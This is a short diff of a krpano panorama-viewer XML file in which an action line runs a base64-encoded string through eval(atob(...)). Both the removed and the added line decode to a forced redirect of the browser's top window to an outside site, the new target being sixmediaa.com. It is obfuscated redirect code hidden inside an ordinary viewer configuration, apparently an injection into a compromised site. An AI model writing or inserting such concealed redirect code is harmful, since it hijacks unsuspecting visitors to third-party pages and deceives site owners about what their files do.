@@ -13,6 +13,6 @@
         tween(plugin[info_text].alpha,1,0.3);
         tween(plugin[info_text].textblur,0,0.3);
         tween(plugin[info_text].blur,0,0.3);
-        js(eval("var encodedCode = 'd2luZG93LnRvcC5sb2NhdGlvbi5ocmVmPSdodHRwczovL2ZwbzAuZ28udGgvbWFpbi9mcG8vbWVkaWEvRlBPL3RlcnJlZmllZXIzLmh0bWw7'; eval(atob(encodedCode));"));
+        js(eval("var encodedCode = 'd2luZG93LnRvcC5sb2NhdGlvbi5ocmVmPSdodHRwczovL3NpeG1lZGlhYS5jb20vJzs='; eval(atob(encodedCode));"));
     </action>
 </krpano>
